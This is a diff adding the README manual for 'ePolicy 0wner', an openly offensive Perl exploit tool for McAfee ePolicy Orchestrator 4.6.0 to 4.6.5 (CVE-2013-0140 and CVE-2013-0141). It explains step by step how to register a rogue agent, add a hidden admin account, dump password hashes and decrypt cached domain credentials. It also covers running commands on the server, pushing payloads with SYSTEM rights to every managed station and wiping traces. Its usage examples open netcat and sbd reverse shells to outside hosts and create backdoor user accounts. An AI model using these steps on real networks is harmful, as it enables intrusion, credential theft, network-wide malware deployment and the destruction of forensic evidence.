@@ -1,0 +1,526 @@
+=====================================================================================================
+**                                   ~= ePolicy 0wner v0.1 =~                                      **
+**                                                                                                 **
+**            McAfee ePolicy Orchestrator (version 4.6.0 -> 4.6.5)  -  A sexy exploit              **
+**                                                                                                 **
+**                 Author:  jerome.nokin@gmail.com                                                 **
+**                   Blog:  http://funoverip.net                                                   **
+**                    CVE:  CVE-2013-0140 + CVE-2013-0141                                          **
+**          Discovered on:  20 November 2012                                                       **
+**               Fixed on:  25 April 2013                                                          **
+**                                                                                                 **
+=====================================================================================================
+
+=====================================================================================================
+ INTRODUCTION
+=====================================================================================================
+
+- In short, this tool registers a rogue agent on the ePo server and then takes advantage of the 
+  following vulnerabilities to perform multiple actions :
+
+	- CVE-2013-0140 : Pre-auth SQL Injection
+	- CVE-2013-0141 : Pre-auth Directory Path Traversal
+
+- The tool manages the following actions, called "mode" :
+
+     -r, --register          Register a new agent on the ePo server (it's free)
+     --check                 Check the SQL Injection vunerability
+     --add-admin             Add a new web admin account into the DB
+     --readdb                Retrieve various information from the database
+     --get-install-path      Retrieve the installation path of ePo software (needed for other modes)
+     --ad-creds              Retrieve and decrypt cached domain credentials from ePo database.
+     --wipe                  Wipe our traces from the database and file system
+     --srv-exec              Perform remote command execution on the ePo server
+     --srv-upload            Upload files on the ePo server
+     --cli-deploy            Deploy commands or softwares on clients
+
+
+- It is strongly advised to read the manual which explains how to use these modes (see below). 
+  But basically, your two first actions must be :
+
+	1) Register a rogue agent using '--register'
+
+	2) Setup Remote Code execution using '--srv-exec --wizard'
+	   
+
+- Usage examples are provided at the end of this file. It is recommended to read the doc before
+  any of usage of them.
+
+- You may find a vulnerable version of the ePo software on my blog. Deploy 2 VMs (eposrv + epocli) and
+  test it !
+
+- The tool was developed/tested on Backtrack 5r3, Kali Linux 1.0.6 and Ubuntu 12.04. 
+  It won't work under Windows due to linux tools dependencies.
+  . ePolicy Orchestrator was running on Win2003 and Win2003 R2
+  . The managed station were running on WinXPsp3 and Win7
+
+
+
+=====================================================================================================
+ DEPENDENCIES
+=====================================================================================================
+
+Using APT-GET or similar
+------------------------
+
+        On Ubuntu / Debian / Backtrack / Kali / etc. you can do:
+
+        apt-get install libcrypt-openssl-dsa-perl libcrypt-openssl-dsa-perl libcrypt-openssl-rsa-perl \
+                libcrypt-openssl-bignum-perl libcrypt-rijndael-perl libarchive-zip-perl \
+                libio-socket-ssl-perl libxml-simple-perl libhtml-tokeparser-simple-perl \
+		libtext-simpletable-perl lcab cabextract p7zip-full
+
+	
+Manual installation
+-----------------------
+
+	Perl modules
+	------------
+
+	Crypt::OpenSSL::DSA
+	Crypt::OpenSSL::RSA
+	Crypt::OpenSSL::Bignum
+	Crypt::Rijndael
+	IO::Socket:SSL
+	XML::Simple
+	Archive::Zip
+	HTML::TokeParser::Simple
+	Text::SimpleTable
+
+	Linux tool
+	----------
+
+	cabextract	(http://www.cabextract.org.uk/)
+	lcab		(http://ohnopub.net/~ohnobinki/lcab/)
+	7z		(from p7zip)
+
+
+
+=====================================================================================================
+ TODO 
+=====================================================================================================
+
+- Add "--sql" mode to let you drive your favourite SQL statements manually.
+ 
+- In "--ad-creds" mode, add a workaround to let you derypt the password locally instead of server-side.
+  This mode upload and exec a Java class on the server to read the keystore. The class file will probably
+  be flagged by McAfee AV soon ...
+
+- Standalone version: "Managed Stations" owning could also be performed "FROM" the epo server, even if
+  the security patch has been deployed. It would require the administrator password of the OS and MSSQL.
+
+
+=====================================================================================================
+ MANUAL
+=====================================================================================================
+
+Usage: ./ePolicyOwner.pl <MODE> [OPTIONS...]
+
+COMMON OPTIONS
+
+  -h, --help                            Short help version
+  -v, --verbose                         Be verbose ...	
+  -c, --config <filename>               An alternative configuration file to store agent data (default: epo.conf).		
+  --no-color				Disable colored output
+ 
+
+MODES (See information, parameters and usage below)
+
+  -r, --register                        Register a new agent on the ePo server (it's free)
+  --unregister				Delete your agent from the ePo server
+  --check                               Check the SQL Injection vunerability
+  --add-admin                           Add a new web admin account into the DB
+  --readdb                              Retrieve various information from the database
+  --get-install-path                    Retrieve the installation path of ePo software (needed for some other modes)
+  --ad-creds                            Retrieve and decrypt cached domain credentials from ePo database.
+  --wipe                                Wipe our traces from the database and file system
+  --srv-exec                            Perform remote command execution on the ePo server
+  --srv-upload                          Upload files on the ePo server
+  --cli-deploy                          Deploy commands or softwares on clients
+
+--------------------------------------------------------------------------------------------------------
+MODE: --register, -r (Register a new agent on the ePo server)
+--------------------------------------------------------------------------------------------------------	
+
+Information:
+------------
+
+  - MANDATORY: This must be your first action. In order to exploit the vulnerability, you must register 
+    a fake agent into the system.
+  - Each request sent to the ePo servers must be digitally signed using a DSA key, assigned to 
+    your agent, and known by the ePo server. 
+  - This mode generates various Agent information (including DSA key pair) and send a registration 
+    request to the server.
+  - All information generated during this mode is stored in a configuration file (DSA keys are stored 
+    in pem files). The configuration file is then used by the other modes.
+  - Upon success, '--check' automatically starts (see below).
+
+Synopsis:
+---------
+
+  ./ePolicyOwner.pl --register --server-host <ip> [--server-port <port>] [--agent-hostname <host>] [--agent-ip <ip>]
+
+Valid options for this mode are (* = Mandatory):
+------------------------------------------------
+	
+* --sh, --server-host <ip>              The hostname or IP address of the ePo server 
+  --sp, --server-port <port>            The SSL port used for Agent-Server communication (default: 443)
+  --ah, --agent-hostname <hostname>     The hostname of the new agent (default: random)
+  --ai, --agent-ip <ip>                 The IP address of the new agent (default: random)
+
+
+
+--------------------------------------------------------------------------------------------------------
+MODE: --unregister 
+--------------------------------------------------------------------------------------------------------
+
+Information:
+------------
+
+  - This mode simply remove your rogue agent from the ePo database
+
+Synopsis:
+---------
+
+  ./ePolicyOwner.pl --unregister 
+
+
+--------------------------------------------------------------------------------------------------------
+MODE: --check
+--------------------------------------------------------------------------------------------------------
+
+Information: 
+------------
+
+  - REQUIREMENT: Use '--register' first
+  - Check if the ePo server is vulnerable to SQL injection using a time-based query.
+  - This mode automatically starts after --register. 
+                      
+Synopsis:
+---------
+
+  ./ePolicyOwner.pl --check
+
+--------------------------------------------------------------------------------------------------------
+MODE: --add-admin
+--------------------------------------------------------------------------------------------------------
+
+Information:
+------------ 
+  - REQUIREMENT: Use '--register' first
+  - This mode add a new (invisible) Web administrator to the ePo database.
+  - This admin account is needed for other modes such as '--srv-exec --setup-nondba'
+  - You may provide with a username and/or password, or let the tool generates it for you.
+
+Synopsis:
+---------
+
+   ./ePolicyOwner.pl --add-admin [--user <username>] [--pass <password>]
+   ./ePolicyOwner.pl --add-admin --clean
+
+Valid options for this mode are:
+--------------------------------
+
+  --user <username>	The desired username (default: random)
+  --pass <password>	The desired password (default: random)
+  --clean		Remove our admin account from the database
+
+
+--------------------------------------------------------------------------------------------------------
+MODE: --readdb
+--------------------------------------------------------------------------------------------------------
+
+Information:
+ -----------
+
+  - REQUIREMENT: Use '--register' first
+  - This mode retrieves information from the database. Since the SQL injection result is not
+    reflected in the HTTP response, we have to use some tricks.
+    The HTTP responses sent back by the server contains a file called Policy.xml which contains 
+    some values present in the ePo  database.
+    The trick is 'simply' to add new crafted values into the DB, populated by the result 
+    of our "SELECT". The SELECT output will then be reflected inside the Policy.xml file.
+    Note that, upon policy update requests, all stations receive the new Policy.xml file,
+    but discard the unknown settings. Except us :)
+    The crafted queries can be removed by using '--wipe' mode (see below)
+
+Synopsis:
+---------
+
+  ./ePolicyOwner.pl --readdb [--hash] [--agents]
+
+Valid options for this mode are:
+--------------------------------
+        
+  --hash	Prints the user accounts table. The passwords are hashed using the following function:
+                uri_escape(base64(SHA1(<password><salt>)<salt>))
+		<salt> is 4 bytes length.
+  --agents	Prints the agents list registered in the ePo server (hostname, ip, OS, ...).
+
+
+--------------------------------------------------------------------------------------------------------
+MODE: --srv-upload
+--------------------------------------------------------------------------------------------------------
+
+Information:
+------------
+ 
+  - REQUIREMENT: Use '--register' first
+  - This mode uploads a local file on the ePo server. The file is stored under the 'DBFolder' folder
+    which by default is 'C:\PROGRA~1\McAfee\EPOLIC~1\DB'.
+    You may use '--get-install-path' to know the real installation path (recommended).
+
+Synopsis:
+---------
+
+  ./ePolicyOwner.pl --srv-upload --src-file </path/to/local/file> --dst-file <filename>
+
+Valid options for this mode:
+----------------------------        
+
+  --src-file </path/to/file> 	The path to the local file you'd like to upload on the server (MANDATORY)
+
+  --dst-file <filename>		The destination file where you want to store the file. (MANDATORY)
+				The file will be stored under the ePo installation folder.
+				Example: 
+				  --dst-file Software/evil.exe      to store the file under '<epo>\Software' folder
+				  --dst-file ../../../../evil.exe   to store the file under C:\
+
+--------------------------------------------------------------------------------------------------------
+MODE: --srv-exec
+--------------------------------------------------------------------------------------------------------
+
+Information:
+------------
+
+  - REQUIREMENT: Use '--register' first
+  - This mode perform remote command execution on the ePo server using one of the following methods:
+
+    1) DBA MODE: 
+       If we have DBA privs, we use xp_cmdshell 'cmd.exe /c <cmd>'. 
+       This methods run commands "Synchronously".
+
+    2) NonDBA MODE: 
+       If we don't have DBA privs, we add an "Automatic Response rule" inside the ePO DB, linked to
+       a new "Registered EXE" (cmd.exe)". 
+       The 'Automatic Response Rule' monitors for 'Events' sent by our Agent. For each Event, the rule 
+       start the 'Registered EXE' (cmd.exe) with the following parameters "/c {hostname}". 
+       {hostname} is a crafted XML tag presents in our Event request.
+       So, in order to execute a command, we just have to send an Event request and set the 
+       hostname field to <cmd>.
+       This method run commands "Asynchronously". It could take up to one minute before execution.
+
+  - How to know which exec mode to use ?
+    
+    Well, use '--srv-exec --wizard'. This interactive wizard will configure everything for you. 	
+
+
+Synopsis:
+---------
+
+  ./ePolicyOwner.pl --srv-exec --wizard
+  ./ePolicyOwner.pl --srv-exec --cmd <command> [--force-nondba]
+  ./ePolicyOwner.pl --srv-exec --setup-nondba [--force-nondba]
+  ./ePolicyOwner.pl --srv-exec --clean-nondba [--force-nondba]
+  ./ePolicyOwner.pl --srv-exec --clean-cmd-history [--force-nondba]
+
+
+Valid options for this mode:
+-----------------------------        
+
+  --wizard              USE ME FIRST. Let me configure this for you!
+
+  --cmd <command>       The Windows command to execute. <command> will be prefixed by 'cmd.exe /c' 
+                        Example: --cmd "ping -n 10 192.168.0.1"
+
+  --clean-cmd-history   NonDBA mode only: This parameter clean up our "events", and then the list
+                        of command we already executed on the ePo server.
+
+Other options for this mode (you should not need them):
+-------------------------------------------------------
+
+  --force-nondba	In some cases, you may want to use non-dba mode.. (debugging is one of the case)
+
+  --setup-nondba	Add an "automatic response rule" via ePo web console + a registered executable file.
+			Will be managed by 'ePowner --srv-exec --wizard'
+
+  --clean-nondba	Cleanup the ePo database from any modifications made by --setup-nondba
+			Will be managed by 'ePowner.pl --wipe'
+
+
+--------------------------------------------------------------------------------------------------------
+MODE: --cli-deploy
+--------------------------------------------------------------------------------------------------------
+
+Information:
+------------
+ 
+  - REQUIREMENT: Use '--register' first
+  - REQUIREMENT: Use '--srv-exec --wizard' to setup remote command execution on ePo server
+  - REQUIREMENT: You need PRIVILIEGED Remote Code Exec on the ePo server (--wizard will notify you) 
+
+  - This mode hacks various files on the ePo server (such as catalog.z, PkgCatalog.z) and performs
+    "Product Deployment" or "Command Execution" (with SYSTEM privs) on the managed stations.
+    The ePo repository will be updated with your files, and also replicated on all Agent-Handlers
+    (Multiple Agent-Handler are typically used in large network with remote branch offices to reduce 
+    network traffic between the managed stations and the master ePo repository).
+
+  - You may choose to deploy your evil stuff on ALL stations, or only a subset of them.
+    To get the list of agents (in order to select your victims), run './ePolicyOwner.pl --readdb --agents'
+
+  - Please Notet that: Deploying = Upload + Execute
+
+  - But also that: Be sure to give enough time to the target agent(s) to install your rogue package before
+    sending a new one. Each time you use this mode, the previous rogue package (if any) is overwritten from 
+    the repository.
+
+  - To observe/debug this mode, you can open the 'McAfee Agent Status Monitor' windows of a station.
+    You should see that the agent receives a "WakeUp" call, then a new "Deployement Task", and then executes it.
+   
+  - It could takes some minutes to the agents to execute your command/file..
+
+Synopsis:
+---------
+
+   ./ePolicyOwner.pl --cli-deploy --targets <...> --cmd <command>
+   ./ePolicyOwner.pl --cli-deploy --targets <...> --file </path/to/file> [--file-args "arguments"]
+   ./ePolicyOwner.pl --cli-deploy --targets <...> --template </path/to/folder> 
+	
+Valid options for this mode:
+---------------------------
+
+  --targets <...>          The victim stations. Valid values are :
+                                --targets __ALL__ (for all stations)
+                                --targets host1,host2,host3
+
+  --file </path/to/file>   The file you would like to upload/exec on the victim(s). The file will
+                           be added to a new McAfee product and then deployed on the managed stations.
+                           The new product will also embed a batch file called 'run.bat' which contains
+                           something similar to 'start <your file>'. We use this batch file to start 
+                           the execution of your file in background and return immediately.
+                           If we don't proceed like this, the deployment task will keep running
+                           on the station until your file exits, which blocks further tasks..
+
+  --file-args <args>       Optional arguments you'd like to pass to your software. To use with '--file' only.
+                           Example: --file /tmp/sbd.exe --file-args "-e cmd.exe 192.168.0.4 9090"
+
+  --cmd <command>          The Windows command to execute. <command> will be stored 'as it' inside 
+                           a batch file (run.bat). The batch file is then packaged into a new McAfee 
+                           product, and then deployed on the managed stations.
+                           Example: --cmd "ping -n 10 192.168.0.1"
+
+  --template <path/to/folder>   See cli-deploy-templates/README.txt 
+
+
+Sexy examples:
+--------------
+
+   # Open a reverse shell from two clients, using sbd.exe 
+   # note: This example is stupid since McAfee will recognise sbd.exe as a backdoor. 
+   #       It's just to give you an idea :)
+   ./ePolicyOwner.pl --cli-deploy --targets HOST1,HOST2 --file /tmp/sbd.exe --file-args "-e cmd.exe 7.3.3.7 4444"
+
+   # Create a local account on two clients
+   ./ePolicyOwner.pl --cli-deploy --targets HOST1,HOST2 --cmd "net user haxor Hax0r.123 /add"
+
+--------------------------------------------------------------------------------------------------------
+MODE: --ad-creds
+--------------------------------------------------------------------------------------------------------
+
+Information:
+------------
+
+  - REQUIREMENT: Use '--register' first
+  - REQUIREMENT: Use '--srv-exec --wizard' to setup remote command execution on ePo server
+  - REQUIREMENT: You need PRIVILIEGED Remote Code Exec on the ePo server (--wizard will notify you)
+
+  - This mode retrieve and decrypt cached domain credentials from ePo database.
+
+  - There are two places in the database where domains credentials can be found:
+      - Directory Synchronisation: Used to synchronise information between ePo and your Active Directory
+      - User Preferences: ePo admins may store domain credentials information in order to permit
+                          automatic Agent deployment on new detected systems.
+
+  - The passwords are encrypted using AES-128. The AES symmetric key is stored inside a keystore called
+    'orion.keystore' and the keystore password is hardcoded inside the ePo Application server source code.
+    In order to retrieve/decrypt the passwords, we upload a Java class 'DumpKey.class' (see in tools/) on
+    the server, and execute it using the JRE version shipped with ePo. Actually, that code throw an execption
+    when ran on my Linux. I have no idea why but finally decided to execute it on server side and then 
+    retrieve the output.
+
+Synopsis:
+---------
+
+   ./ePolicyOwner.pl --ad-creds
+
+
+--------------------------------------------------------------------------------------------------------
+MODE: --wipe
+--------------------------------------------------------------------------------------------------------
+
+Information:
+------------
+
+  - Wipe our traces from :
+        - The database: about 15 tables hosting Task, Logs, Events, .. 
+        - The filesystem: actually, the repository if '--cli-deploy' was used. The good news is that the
+          changes are also replicated on the other AgentHandlers (repository caches).
+          Note that the apache/Tomcat logfiles are not wipped since they are currently in use.
+
+  - The attacker agent configuration is however not deleted. (so you can still use it). In order to remove
+    your fake agent from the ePo server, please use '--unregister'.
+
+  - This mode is automatically called by '--unregister'
+
+Synopsis:
+---------
+
+   ./ePolicyOwner.pl --wipe
+
+
+--------------------------------------------------------------------------------------------------------
+USAGE EXAMPLES
+--------------------------------------------------------------------------------------------------------
+
+# Register an agent
+./ePolicyOwner.pl --register --server-host epo-srv.victim.local
+./ePolicyOwner.pl --register --server-host epo-srv.victim.local --agent-hostname MYHOST1 --agent-ip 1.2.3.4
+
+# Check for SQL Injection vulnerability (--register automatically starts it)
+./ePolicyOwner.pl --check
+
+# Setup CmdExec on the server
+./ePolicyOwner.pl --srv-exec --wizard
+
+# Execute an OS command on the server
+./ePolicyOwner.pl --srv-exec --cmd "ping 192.168.0.1"
+
+# Add a new Web admin account
+./ePolicyOwner.pl --add-admin
+
+# Read both agents and hashes from the database
+./ePolicyOwner.pl --readdb --agents --hash
+
+# Retrieve (and decrypt) Cached Domain credentials from ePO DB
+./ePolicyOwner.pl --ad-creds
+
+# Upload and exec netcat on the server
+./ePolicyOwner.pl --srv-upload --src-file /tmp/nc.exe --dst-file ../../../../nc.exe  (=> C:\nc.exe)
+./ePolicyOwner.pl --srv-exec --cmd "c:\nc.exe -e cmd.exe 192.168.0.100 9999"
+
+# Deploy a software on two selected stations
+./ePolicyOwner.pl --cli-deploy --file /tmp/evil.exe --targets HOST1,HOST2
+
+# Same as previous example, but including arguments to the software 
+./ePolicyOwner.pl --cli-deploy --file /tmp/nc.exe --file-args "-e cmd.exe 192.168.0.4 9090" --targets HOST2
+
+# Execute an OS command on ALL stations
+./ePolicyOwner.pl --cli-deploy --cmd "ping 192.168.0.100" --targets __ALL__
+
+# Cleaning up our traces (DB & repositories)
+./ePolicyOwner.pl --wipe
+
+# Unregister our agent (and get back to life.. )
+./ePolicyOwner.pl --unregister
+
+
